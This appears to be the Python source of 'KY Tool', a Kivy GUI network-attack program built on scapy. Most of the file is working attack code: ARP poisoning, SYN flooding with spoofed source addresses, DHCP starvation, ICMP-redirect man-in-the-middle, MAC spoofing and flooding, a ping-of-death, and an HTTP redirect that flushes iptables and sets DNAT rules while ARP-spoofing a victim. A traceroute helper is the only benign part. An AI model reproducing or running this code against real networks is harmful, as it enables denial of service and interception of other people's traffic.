from kivy.app import App
from kivy.uix.screenmanager import Screen,ScreenManager
from kivy.uix.screenmanager import SlideTransition
from kivy.uix.button import Button
from kivy.properties import StringProperty,ObjectProperty
from kivy.lang import Builder
from kivy.clock import mainthread,Clock
from kivy.uix.popup import Popup
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.checkbox import CheckBox
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from functools import partial
from kivy.uix.scrollview import ScrollView
from scapy.all import *
import threading,logging
from random import randint
from subprocess import Popen,PIPE
from kivy.core.window import EventLoop
import os
Builder.load_file("gui.kv")
class MLabel(Label):
    pass
class MComputer(object):
    ip=None
    mac=None
    iface=None
class TraceOutput(object):
    ex_time=None
    ssl_ttl=None
    ip_route=None
    def __init__(self,ext,ttl,rout):
        self.ex_time=ext
        self.ssl_ttl=ttl
        self.ip_route=rout

class Deamon(threading.Thread):
    def __init__(self,mwins):
        super(Deamon,self).__init__()
        self.mwins=mwins
    @mainthread
    def run(self):
        self.scan()
    def scan(self):
        self.mwins.hosts=[]
        ip=str(MComputer.ip)+"/24"
        ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=1,verbose=1,iface=MComputer.iface)
        if ans:
            for snd,rcv in ans:
                tgtIp=rcv[ARP].psrc
                tgtMac=rcv[Ether].src
                self.mwins.hosts.append(Hosts(ip=tgtIp,mac=tgtMac))
        self.mwins.set_hosts()




class Hosts(object):
    def __init__(self,ip,mac):
        self.ip=ip
        self.mac=mac

class MWindow(Screen):
    def on_pre_enter(self, *args):
        super(MWindow,self).on_pre_enter(*args)
        sname="mainwin"
        if self.iwin:
            if not self.iwin.has_screen(sname):
                mw=MainWindow()
                self.iwin.add_widget(mw)
    def on_enter(self, *args):
        super(MWindow,self).on_enter(*args)

class StartWindow(Screen):
    def scan_hosts(self):
        self.find_ip()
        sname="mwin"
        mw=MWindow(name=sname)
        MComputer.iface=self.iface if self.iface else "eth0"
        MComputer.ip=self.ip
        MComputer.mac=self.mac
        if not sm.has_screen(sname):
            sm.add_widget(mw)
        sm.current=sname
    def find_ip(self):
        data=Ether()/IP(dst="192.168.1.1")
        self.ip=data[IP].src
        self.mac=data[Ether].src
    def set_interface(self,face,*args):
        self.iface=face
    def get_interfaces(self,cmd):
        proc=Popen(cmd,shell=True,stdout=PIPE,stdin=PIPE).communicate()[0]
        res=proc.decode("utf-8").splitlines()
        return res
    def __init__(self,**kwargs):
        super(StartWindow,self).__init__(**kwargs)
        inters=self.get_interfaces("ls /sys/class/net")
        self.iface="eth0"
        for iface in inters:
            lbl=Label(text=iface)
            cbok=CheckBox(group="face")
            cbok.bind(active=partial(self.set_interface,iface))
            self.ids["interfaces"].add_widget(lbl)
            self.ids["interfaces"].add_widget(cbok)

class MainWindow(Screen):
    hosts=[]
    jobs=[]
    go=False
    def __init__(self,**kwargs):
        super(MainWindow,self).__init__(**kwargs)
        self.interface=MComputer.iface
        self.ip=MComputer.ip
        self.mac=MComputer.mac
        self.scan_hosts()
    interface=StringProperty(None)
    ip=StringProperty(None)
    mac=StringProperty(None)
    def get_mac(self,ip):
        for x in self.hosts:
            if x.ip==ip:
                return x.mac
        return None
    def set_hosts(self):
        self.disp.clear_widgets()
        if self.hosts.__len__()>0:
            tgt=set()
            gw=set()
            for host in self.hosts:
                self.disp.add_widget(Button(text="IP "+host.ip))
                tgt.add(host.ip)
                gw.add(host.ip)
            self.disp.height=(self.disp.children.__len__()-1)*100
            self.target.values=tgt
            self.gateway.values=gw
        else:
            self.disp.add_widget(Button(text="Not Found Any Device\nTap to Search",on_release=self.scan_hosts))
        self.info_msg("Scanning Hosts Finished found %s hosts"%str(len(self.hosts)))
    def scan_hosts(self,inst=None):
        self.info_msg("Scannning Hosts Please wait...")
        Deamon(self).run()
    def arp_spoof(self):
        if self.check_target_gateway():
            return
        tgt=self.target.text
        gw=self.gateway.text
        tgt_mac=self.get_mac(tgt)
        gw_mac=self.get_mac(gw)
        v=ARP(pdst=tgt,psrc=gw,hwdst=tgt_mac,op=2)
        gw=ARP(pdst=gw,psrc=tgt,hwdst=gw_mac,op=2)
        self.info_msg("Arp Poison Started...")
        self.stop_jobs()
        Clock.schedule_interval(partial(self.poison,v,gw),1)
        self.jobs.append("arppoison")
        self.go=True
    @mainthread
    def poison(self,v,gw,nap):
        if self.go:
            try:
                send(v,verbose=0,inter=2,loop=0)
            except:pass
            try:
                send(gw,verbose=0,inter=2,loop=0)
            except:pass
    def arp_cache(self):
        self.info_msg("Arp Pings Sending")
        arp=ARP(psrc=str(self.gateway.text),pdst=str(self.target.text))
        self.stop_jobs()
        Clock.schedule_interval(partial(self.sendpacks,arp),0.1)
        self.jobs.append("oneway")
        self.go=True
    def stop_attacks(self):
        self.stop_jobs()
    @mainthread
    def sendpacks(self,pkt,nap):
        if self.go:
            try:
                send(pkt)
            except:
                pass
            self.info_msg(" Packet sending ...please wait time :"+str(nap))
    def stop_jobs(self):
        if self.jobs.__len__()>=0 and self.go:
            for x in self.jobs:
                if "synflood" in x:
                    Clock.unschedule(self.synFlood,all=True)
                if "arppoison" in x:
                    Clock.unschedule(self.poison,all=True)
                if "oneway" in x:
                    Clock.unschedule(self.sendpacks,all=True)
                if "macflood" in x:
                    Clock.unschedule(self.do_mac_flood,all=True)
                if "icmpredirect" in x:
                    Clock.unschedule(self.do_icmp_attack,all=True)
                if "dhcpstar" in x:
                    Clock.unschedule(self.do_dhcp_star,all=True)
                self.jobs.remove(x)
            self.go=False
            self.info_msg("Attack Finished!!")
    def dhcp_shock(self,inst):
        self.info_msg("Go to command prompt to execute script")
        return
        self.stop_jobs()
        if inst.text=="Dhcp Shock":
            from dhcpshock import Shocking
            inst.text="Executing..."
            self.s=Shocking(root=self,iface=self.interface)
            self.s.sniff()
        elif inst.text=="Executing...":
            self.s.cancel(True)
            inst.text="Dhcp Shock"
            self.s=None
    def ip_forward(self,ins):
        if ins.state=="down":
            self.forward()
            ins.text="Ip Forward Enabled"
        elif ins.state=="normal" or ins.state is None:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            ins.text="Ip Forward Disabled"
    def forward(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    def info_msg(self,msg):
        if self.parent:
            self.parent.info.text=msg
    def fake_ip(self):
        ip=self.ip.split(".")
        nip=ip[0]+"."+ip[1]+"."+ip[2]+"."+str(randint(1,254))
        return nip
    def syn_flood(self):
        if self.target.text=="Not Set":
            self.info_msg("Please set a target")
            return
        self.stop_jobs()
        tgt=self.target.text
        dports=self.scanPorts()
        dports.append(80)
        self.stop_jobs()
        Clock.schedule_interval(partial(self.synFlood,dports,tgt),0.3)
        self.jobs.append("synflood")
        self.info_msg("Syn Flood Attack Started")
        self.go=True
    @mainthread
    def synFlood(self,dports,tgt,nap):
        if self.go:
            opt=[('Timestamp',(10,0))]
            ip=IP(dst=tgt,id=111,ttl=99)
            ip.src=self.fake_ip()
            tcp=TCP(sport=RandShort(),dport=dports,seq=12345,ack=1000,window=1000,flags="S",options=opt)
            payload="KYNETWORKATTACKSKIVY"
            pck=ip/tcp/payload
            try:
                send(pck,inter=2,verbose=0)
            except:pass
    def snif(self):
        print("Not implemented")
    def dhcp_star(self):
        self.stop_jobs()
        Clock.schedule_interval(self.do_dhcp_star,0.1)
        self.jobs.append("dhcpstar")
        self.go=True
        self.dhcpcnt=0
    @mainthread
    def do_dhcp_star(self,nap):
        if self.go:
            self.dhcpcnt=self.dhcpcnt+1
            self.info_msg("%s Sending Request"%(str(self.dhcpcnt)))
            discover =  Ether(src=RandMAC("*:*:*:*:*:*"),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
            sendp(discover,loop=0)

    def dns_spoof(self):
        print("dns spoof")
    def icmp_redirect(self):
        if self.check_target_gateway():
            return
        ibox=BoxLayout(orientation="vertical")
        vals=set()
        for x in self.hosts:
            vals.add(x.ip)
        self.sourceip=Spinner(values=vals,text="Select A Computer To MITM(optional)",size_hint=(1,None),height=30)
        btn=Button(text="Attack",on_release=self.go_icmp_click,size_hint=(1,None),height=30)
        ibox.add_widget(self.sourceip)
        ibox.add_widget(btn)
        self.icmppop=Popup(title="Enter Ip to Redirect",content=ibox,size_hint=(None,None),size=(300,150))
        self.icmppop.open()
    def go_icmp_click(self,ins):
        self.stop_jobs()
        self.icmppop.dismiss()
        Clock.schedule_interval(self.do_icmp_attack,0.01)
        self.info_msg("Icmp Attack Started!!!")
        self.go=True
        self.jobs.append("icmpredirect")
        self.forward()
        os.system("iptables -A OUTPUT -p icmp -j DROP")
        #dinleme tcpdump -A -i iface(eth0) -l -n
    @mainthread
    def do_icmp_attack(self,nap):
        if self.go:
            old_gw=self.gateway.text
            new_gw=self.ip
            tgt=self.target.text
            ip1=IP(src=old_gw,dst=tgt)
            icmp=ICMP(type=5,code=1,gw=new_gw)
            dst=""
            if self.sourceip.text=="Select A Computer To MITM(optional)":
                dst="0.0.0.0"
            else:
                dst=str(self.sourceip.text)
                self.info_msg_append("Attacking to "+dst)
            ip2=IP(src=tgt,dst=dst)
            pack=ip1/icmp/ip2
            send(pack)
    def check_target_gateway(self):
        rst=False
        if self.target.text=="Not Set" or self.gateway.text=="Not Set":
            self.info_msg("Please Select a target and gateway to spoof")
            rst=True
        return rst


    def mac_spoof(self):
        if self.check_target_gateway():
            return
        self.stop_jobs()
        self.info_msg("Mac Spoofing Started")
        Clock.schedule_interval(self.do_mac_spoof,3)
        self.jobs.append("macspoof")
        self.go=True
    @mainthread
    def do_mac_spoof(self,nap):
        if self.go:
            target=self.target.text
            tgtMac=self.get_mac(target)
            gateway=self.gateway.text
            gwMac=self.get_mac(gateway)
            arp=ARP(psrc=self.ip,pdst=gateway,hwdst=gwMac,hwsrc=tgtMac)
            send(arp)
    def trace_route(self,dst):
        MAX_HOP=20
        find_hopes=1
        routes=[]
        print(dst)
        for i in range(1,MAX_HOP):
            time_wait=time.time()
            packet = IP(dst=dst, ttl=i, id=RandShort())/TCP(flags=0x2)
            answered, unanswered = sr(packet, timeout=3)
            for sent, received in answered:
                tmp=time.time()
                execution= float("{0:.1f}".format(tmp-time_wait))
                #print(execution,sent.ttl, received.src,isinstance(received.payload, TCP))
                if self.not_exits_route(received.src,routes):
                    routes.append(TraceOutput(execution,sent.ttl,received.src))
                    find_hopes+=1
        def dismiss(ins):
            if self.pop:
                self.pop.dismiss()
        scroll=ScrollView(size_hint=(1,1))
        box=BoxLayout(orientation="vertical",size_hint=(1,None),padding=3)
        if routes.__len__()>0:
            box.add_widget(Button(text="TTL  EXECUTE TIME   ROUTES",size_hint=(1,None),height=30))
            for trace in routes:
                box.add_widget(Button(markup=True,text=str(trace.ssl_ttl)+"[color=#d05018] [ "+str(trace.ex_time)+" ms ][/color]  [color=#1d8cb6]["+str(trace.ip_route)+"][/color] ",size_hint=(1,None),height=30))
        else:
            box.add_widget(Button(text="No Routes Found",size_hint=(1,None),height=30))
        box.add_widget(Button(text="Close",on_release=dismiss,size_hint=(1,None),height=30))
        box.height =50*find_hopes
        scroll.add_widget(box)
        self.pop=Popup(title="SCAN SUMMARY For "+dst,content=scroll,size_hint=(None,None),size=(400,300))
        self.pop.open()
    def set_destination(self):
        try:
            mybox=BoxLayout(orientation="vertical")
            inpt=TextInput(size_hint=(1,None),height=30,multiline=False)
            dst = "example.com"
            mybox.add_widget(inpt)
            def go(ins):
                if self.ask:
                    dst=str(inpt.text)
                    self.ask.dismiss()
                    self.trace_route(dst)
            btn=Button(text="Go",on_release=go,size_hint=(1,None),height=30)
            mybox.add_widget(btn)
            self.ask=Popup(title="Set Destination",content=mybox,size_hint=(None,None),size=(300,150))
            self.ask.open()
        except:
            self.info_msg("An Error Occured!!!")
    def info_msg_append(self,msg):
        self.parent.info.text +=msg
    def not_exits_route(self,search,routes):
        for x in routes:
            if x.ip_route==search:
                return False
        return True
    def show_info_aut(self):
        box=BoxLayout(orientation="vertical")
        lbl=Label(text="Yahya Kesenek @2015")
        lbl2=Label(text="Syber Security")
        box.add_widget(lbl)
        box.add_widget(lbl2)
        pop=Popup(title="KY Tool Info",content=box,size_hint=(0.5,0.5))
        btn=Button(text="Close",on_release=pop.dismiss,size_hint_y=None,height=30)
        box.add_widget(btn)
        pop.open()

    def mac_flood(self):
        self.info_msg("Mac Flood Started!!")
        self.stop_jobs()
        Clock.schedule_interval(self.do_mac_flood,0.01)
        self.go=True
        self.jobs.append("macflood")
    @mainthread
    def do_mac_flood(self,nap):
        if self.go:
            self.forward()
            tgthw=RandMAC("*:*:*:*:*:*")
            ethr=Ether(src=RandMAC("*:*:*:*:*:*"),dst=tgthw)
            _ip=IP(src=RandIP("*.*.*.*"),dst=RandIP("*.*.*.*"))
            _icmp=ICMP()
            pack=ethr/_ip/_icmp
            send(pack)
            #send(pack,iface=self.interface)
    def scanPorts(self):
        import port_scanner
        ports=list(port_scanner.get_ports(self.target.text))
        return ports
    def ping_death(self):
        if self.target.text=="Not Set":
            self.info_msg("Please Select a Target")
            return
        dip=self.target.text
        sendp(fragment(IP(dst=dip)/ICMP()/('X'*600000)))
    def go_http(self):
        if self.gateway.text=="xx.xx.xx.1" or self.target.text=="xx.xx.xx.xx":
            self.info_msg("Please Select Target and Gateway")
            return
        box=BoxLayout(orientation="vertical",padding=2,spacing=2)
        clos=Button(text="X",size_hint=(None,None),size=(50,50),pos_hint={"right":1})
        info=Label(text="")
        lbl=MLabel(text="Target Ip")
        tgt=TextInput(text=self.target.text,multiline=False)
        lbl2=MLabel(text="Target Gateway")
        gw=TextInput(text=self.gateway.text,multiline=False)
        lbl3=MLabel(text="Specify a http address")
        tgtGw=TextInput(text="",multiline=False)
        lbl4=MLabel(text="Target Interface")
        iface=TextInput(text=self.interface,multiline=False)
        btn=Button(text="Attack")
        box.add_widget(clos)
        box.add_widget(info)
        box.add_widget(lbl)
        box.add_widget(tgt)
        box.add_widget(lbl2)
        box.add_widget(gw)
        box.add_widget(lbl3)
        box.add_widget(tgtGw)
        box.add_widget(lbl4)
        box.add_widget(iface)
        box.add_widget(btn)
        def flushIPtablesandSetupRedirect(rip):
            os.system("/sbin/iptables --flush")
            os.system("/sbin/iptables -t nat --flush")
            os.system("/sbin/iptables --zero")
            os.system("/sbin/iptables -A FORWARD --in-interface " +  iface.text + " -j ACCEPT")
            os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + iface.text+ " -j MASQUERADE")
            os.system("/sbin/iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination " + rip)

        def attack(btn):
            info.text="attacking started"
            rip= socket.gethostbyname(tgtGw.text)
            print(rip)
            self.forward()
            flushIPtablesandSetupRedirect(rip)
            Clock.schedule_interval(sendArpReply,1)
        @mainthread
        def sendArpReply(nap):
            arp=ARP()
            arp.psrc=gw.text
            arp.pdst=tgt.text
            send(arp)
        def  closeclick(btn):
            self.info_msg("Http Redirect Finished!!")
            Clock.unschedule(sendArpReply)
            self.htpPop.dismiss()
        self.htpPop=Popup(title="Http Redirect",content=box,auto_dismiss=False,size_hint=(0.8,0.8),pos_hint={"center_x":0.5,"center_y":0.5})
        self.htpPop.open()
        clos.bind(on_release=closeclick)
        btn.bind(on_release=attack)















































class GuiApp(App):
    def build(self):
        self.sm=sm
        return self.sm
EventLoop.ensure_window()
sm=ScreenManager(transition=SlideTransition())
sm.add_widget(StartWindow(name="startwin"))
if __name__ == '__main__':
    GuiApp().run()

